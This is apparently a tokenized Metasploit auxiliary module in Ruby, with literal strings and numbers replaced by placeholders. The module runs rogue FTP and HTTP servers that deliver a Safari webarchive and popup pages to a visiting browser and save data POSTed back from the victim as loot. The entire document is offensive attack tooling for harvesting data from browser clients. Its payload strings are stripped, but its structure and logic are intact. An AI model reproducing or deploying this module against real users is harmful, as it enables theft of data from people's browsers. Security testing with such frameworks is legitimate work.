require <str> require <str> class Metasploit3 < Msf :: Auxiliary include Msf :: Exploit :: Remote :: FtpServer include Msf :: Exploit :: Format :: Webarchive include Msf :: Auxiliary :: Report def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > MSF_LICENSE , <str> = > [ <str> ] , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > <str> , <str> = > [ [ <str> , { } ] ] , <str> = > <int> , <str> = > <str> ) ) register_options ( [ OptString . new ( <str> , [ false , <str> ] ) , OptPort . new ( <str> , [ true , <str> , <int> ] ) , OptPort . new ( <str> , [ true , <str> , <int> ] ) ] , self . class ) end def lookup_lhost ( c = nil ) if datastore [ <str> ] == <str> Rex :: Socket . source_address ( c || <str> ) else datastore [ <str> ] end end def on_request_uri ( cli , req ) if req . method =~ <str> data_str = req . body . to_s begin data = JSON :: parse ( data_str || <str> ) file = record_data ( data , cli ) send_response ( cli , <str> ) print_good <str> data . keys . join ( <str> ) <str> file <str> rescue JSON :: ParserError = > e file = record_data ( data_str , cli ) print_error <str> file <str> send_response ( cli , <str> ) end elsif req . uri =~ <str> popup_path <str> send_response ( cli , <int> , <str> , popup_html ) else send_response ( cli , <int> , <str> , exploit_html ) end end def ftp_user @ftp_user || = Rex :: Text . rand_text_alpha ( <int> ) end def ftp_pass @ftp_pass || = Rex :: Text . rand_text_alpha ( <int> ) end def exploit_html <str> popup_path <str> end def ftp_url <str> ftp_user <str> ftp_pass <str> lookup_lhost <str> datastore [ <str> ] <str> end def popup_html <str> ftp_url <str> lookup_lhost <str> payload_name <str> datastore [ <str> ] <str> apple_extension_url <str> end def on_client_command_list ( c , arg ) conn = establish_data_connection ( c ) if not conn c . put ( <str> ) return end print_status ( <str> ) c . put ( <str> ) print_status ( <str> webarchive_size <str> ) month_names = [ <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> ] m = month_names [ Time . now . month - <int> ] d = Time . now . day y = Time . now . year dir = <str> webarchive_size <str> m <str> d <str> y <str> payload_name <str> print_status dir conn . put ( dir ) conn . close print_status ( <str> ) c . put ( <str> ) return end def on_client_command_retr ( c , arg ) conn = establish_data_connection ( c ) if not conn return c . put ( <str> ) end print_status ( <str> ) c . put ( <str> ) conn . put ( webarchive ) conn . close end def volume_name @volume_name || = Rex :: Text . rand_text_alpha ( <int> ) end def payload_name <str> end def popup_path @popup_uri || = Rex :: Text . rand_text_alpha ( <int> ) end def webarchive webarchive_xml end def webarchive_size print_status <str> webarchive_xml . length <str> webarchive_xml . length end def run print_status ( <str> ) start_service start_http end def start_http ( opts = { } ) use_zlib comm = datastore [ <str> ] if ( comm . to_s == <str> ) comm = :: Rex :: Socket :: Comm :: Local else comm = nil end opts = { <str> = > datastore [ <str> ] , <str> = > datastore [ <str> ] , <str> = > comm } . update ( opts ) @http_service = Rex :: ServiceManager . start ( Rex :: Proto :: Http :: Server , opts [ <str> ] . to_i , opts [ <str> ] , datastore [ <str> ] , { <str> = > framework , <str> = > self , } , opts [ <str> ] , datastore [ <str> ] ) @http_service . server_name = datastore [ <str> ] uopts = { <str> = > Proc . new { | cli , req | on_request_uri ( cli , req ) } , <str> = > resource_uri } . update ( opts [ <str> ] || { } ) proto = ( datastore [ <str> ] ? <str> : <str> ) print_status ( <str> proto <str> opts [ <str> ] <str> opts [ <str> ] <str> uopts [ <str> ] <str> ) if ( opts [ <str> ] == <str> ) print_status ( <str> proto <str> Rex :: Socket . source_address ( <str> ) <str> opts [ <str> ] <str> uopts [ <str> ] <str> ) end @service_path = uopts [ <str> ] @http_service . add_resource ( uopts [ <str> ] , uopts ) while @http_service select ( nil , nil , nil , <int> ) end end def use_zlib if ( ! Rex :: Text . zlib_present? and datastore [ <str> ] == true ) fail_with ( Failure :: Unknown , <str> ) end end def resource_uri path = datastore [ <str> ] || Rex :: Text . rand_text_alphanumeric ( <int> + rand ( <int> ) ) path = <str> + path if path !~ <str> datastore [ <str> ] = path return path end def send_response ( cli , code , message = <str> , html = <str> ) proto = Rex :: Proto :: Http :: DefaultProtocol res = Rex :: Proto :: Http :: Response . new ( code , message , proto ) res [ <str> ] = <str> res . body = html cli . send_response ( res ) end def record_data ( data , cli ) name = if data . is_a? ( Hash ) then data . keys . first else <str> end file = File . basename ( name ) . gsub ( <str> , <str> ) store_loot ( file , <str> , cli . peerhost , data , <str> , <str> ) end def cleanup super stop_service begin @http_service . remove_resource ( datastore [ <str> ] ) @http_service . deref @http_service . stop @http_service . close @http_service = nil rescue end end end 
